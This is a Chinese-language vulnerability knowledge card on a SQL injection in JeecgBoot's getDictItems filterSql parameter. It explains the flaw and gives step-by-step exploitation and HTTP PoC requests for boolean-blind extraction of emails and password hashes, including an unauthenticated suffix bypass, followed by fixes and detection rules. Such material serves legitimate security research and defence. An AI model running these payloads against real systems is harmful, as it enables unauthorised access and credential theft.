---
id: web-java-framework-jeecgboot-dict-filter-sql-injection
title: 'JeecgBoot getDictItems filterSql ${} 拼接：黑名单漏 #/or，布尔盲注窃取用户与口令哈希'
type: scenario
domain: web
path: web/java/framework
technique: jeecgboot-dict-filtersql-injection
tags:
- java
- jeecgboot
- mybatis
- sqli
- blind
- boolean
- blacklist-bypass
- hex
- spring-boot
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
affected_versions: JeecgBoot ≤ 3.9.3（filterSql 注入于 v3.9.5 加固）
verification:
  verified_by: verifier-V26
  verified_at: '2026-11-05T02:54:50+08:00'
  notes: '已对照原文与6张图核对：dictCode 四段切分、SysDictMapper 美元符拼接、specialDictSqlXssStr 漏 #/or、1=1 与 1=2 布尔 oracle、email 明文字段读取均与正文/图03-06一致；password LENGTH 定长与 0x 前缀二分仅原文文字结论（cb362cfeefbf3d8d 为靶场数据），无对应截图，未复跑；原文请求含 X-Sign/X-Timestamp，算法未说明，卡内 PoC 未包含该头。已修正 kb add 将标题中 # 后截断的 YAML 问题。版本 ≤3.9.3、修复 v3.9.5 正确。'
url: /docs/web/java/framework/web-java-framework-jeecgboot-dict-filter-sql-injection/
draft: false
kb_aliases:
- JeecgBoot SQL注入
- getDictItems 注入
- dictCode 四段式
- filterSql 注入
- specialDictSqlXssStr 绕过
- 字典接口布尔盲注
- password hex 二分
---

## 一句话结论

JeecgBoot 的 `/sys/dict/getDictItems/{dictCode}` 把 `dictCode` 按逗号拆成 `table,text,code,filterSql` 四段，MyBatis mapper 用 `${text}`、`${code}`、`${table}`、`where ${filterSql}` 原样拼接；`filterSql` 的黑名单漏掉 `#` 与 `or`，攻击者可匿名构造布尔条件，用“返回行/空集”作 oracle 直接读取非黑名单字段（如 email），或用 `LENGTH()` + 十六进制前缀 `password>=0x...` 逐字节二分提取被黑名单保护的口令哈希。

## 原理

- `SysDictController.getDictItems` 接收路径参数 `dictCode`；`SysDictServiceImpl.getDictItems` 按 `,` 拆成四段，第四段 `params[3]` 作为 `filterSql` 传给 `queryTableDictItemsByCodeAndFilter(table, text, code, filterSql)`。
- `SysDictMapper.xml` 的 `queryTableDictWithFilter` 使用 `${}` 拼接：
  - `${text} as "text"`、`${code} as "value"`、`from ${table}`、`where ${filterSql}`；
  - `table/text/code` 虽经过合法字符校验，`filterSql` 只过一套字典专用黑名单。
- 字典黑名单 `specialDictSqlXssStr` 覆盖 `select/insert/update/delete/drop/exec/extractvalue/updatexml/mid/char/substring/--/;` 等，但**不包含 `#`**（MySQL 行注释）和 **`or`**（逻辑或）。这两个缺口足以构造任意布尔表达式。
- 注入点是 `WHERE ${filterSql}`，因此 `filterSql` 为 `1=1` 返回全部行、`1=2` 返回空集，响应 `result` 非空/为空构成布尔 oracle；无需报错回显。
- 非黑名单字段可直接放在 `text` 位原样输出（如 `sys_user,email,id,1=1` 直接列出所有邮箱），无需盲注。
- 黑名单字段（如 `password`）不能直接放 `text` 位，也不能用 `MID/SUBSTRING/LEFT/ORD` 等函数（被黑名单拦截）。可用：
  - `LENGTH(password)>=N` 先二分定长（示例 16 个 hex 字符 = 8 字节）；
  - `password>=0x<hex前缀>` 利用 MySQL 字节串字典序比较，对每个字节 0x00–0xFF 二分，逐字节拼出哈希。
- 若同时利用 Shiro 静态后缀绕过，`dictCode` 末尾的 `.js` 会被拼进 `filterSql`，用 `#` 注释吞掉即可让 SQL 合法执行（见关联卡）。

## 触发条件

- JeecgBoot ≤ 3.9.3，字典接口可被未认证访问（通过 Shiro 后缀绕过或接口本身匿名）。
- `dictCode` 四段式解析逻辑存在，且 `filterSql` 进入 `${}` 拼接。
- 数据库为 MySQL（`#` 行注释、`0x` 十六进制字面量、字节串字典序比较）。
- 响应能区分“有结果/空结果”（`result` 数组长度或状态码差异）。

## 利用步骤

1. 确认接口可达：`GET /jeecg-boot/sys/dict/getDictItems/sys_user,realname,id`（未授权时配合 `.js` 后缀绕过）。
2. 确认布尔 oracle：`.../sys_user,realname,id,1=1#.js` 返回用户行；`1=2#.js` 返回空数组。
3. 直接读取非黑名单字段：把目标字段放在 `text` 位，如 `sys_user,email,id,1=1#.js`，拿到邮箱等数据。
4. 读取黑名单字段：先用 `LENGTH(password)>=N` 二分定长；再对每个字节用 `password>=0x<前缀+候选>` 二分。
5. 记录每次 True/False 响应，逐字节还原；16 个 hex 字符即 8 字节哈希。
6. 用同一方法读取其他表/字段（注意 `table`/`text`/`code` 有字符校验，优先选合法表名与列名）。

## PoC

```http
# 布尔真：返回全部用户
GET /jeecg-boot/sys/dict/getDictItems/sys_user,realname,id,1=1#.js HTTP/1.1
Host: target:8080

# 布尔假：空集
GET /jeecg-boot/sys/dict/getDictItems/sys_user,realname,id,1=2#.js HTTP/1.1
Host: target:8080

# 直接读取非黑名单字段 email
GET /jeecg-boot/sys/dict/getDictItems/sys_user,email,id,1=1#.js HTTP/1.1
Host: target:8080
# => {"code":0,"result":[{"text":"111@1.com","value":"..."}, ...]}

# 黑名单字段 password：先定长，再按字节二分
GET /jeecg-boot/sys/dict/getDictItems/sys_user,realname,id,id='<admin-id>' AND LENGTH(password)>=16#.js HTTP/1.1
GET /jeecg-boot/sys/dict/getDictItems/sys_user,realname,id,id='<admin-id>' AND password>=0x6362#.js HTTP/1.1
```

```text
# 实际执行：
# SELECT realname AS "text", id AS "value" FROM sys_user
# WHERE id='<admin-id>' AND password>=0x6362
# -- #.js 被 MySQL 注释吞掉
```

## 变体与关联

- 变体：用 `or` 代替 `#` 闭合条件（黑名单同样未覆盖 `or`）；或用 `1=1 or '1'='1` 等方式。
- 变体：直接读其他合法表/字段；`table/text/code` 的字符校验若可绕过（大小写、反引号、注释）可扩大读取面。
- 变体：布尔 oracle 被 WAF/限流阻断时，改用时间盲注或报错（若黑名单缺口允许）。
- 关联：[[web-java-framework-shiro-static-suffix-anon-pathvariable-bypass]]（同一组合链的未授权入口，`.js` 后缀绕过 JWT；本条用 `#` 消化该后缀）。
- 关联：[[web-generic-sqli-exists-left-boolean-oracle]]（布尔 oracle 的通用方法）。
- 关联：[[web-generic-sqli-keyword-double-write-bypass]]（黑名单过滤的另一种绕过思路）。
- 边界：v3.9.5 起用 jsqlparser 做结构化白名单，禁止注释、函数、子查询，右操作数必须是字面量，`LENGTH()`/`0x...` 等 payload 失效；WAF 或数据库非 MySQL 时 `#` 与 `0x` 语义不同。

## 检测与防御

- 修复：升级 v3.9.5+；`filterDictConditionSqlFromRequest` 用 jsqlparser 解析为表达式树，只允许“列 比较符 字面量”，禁止注释、函数、子查询与十六进制字面量。
- 修复：根本方案是不要把用户输入拼进 `${}`；表名/列名用白名单映射，条件值用 `#{}` 参数化。
- 加固：字典接口在 Controller/Service 层做认证与角色校验；WAF 对 `filterSql` 中的 `#`、`--`、`or`、`0x`、函数调用做二次拦截；数据库账号最小权限。
- 检测：`dictCode` 含逗号四段且第四段出现引号、比较符、`#`、`0x`、`or`；同一接口 `1=1`/`1=2` 返回行数差异；`LENGTH()`/`0x` 高频请求；匿名访问字典接口。
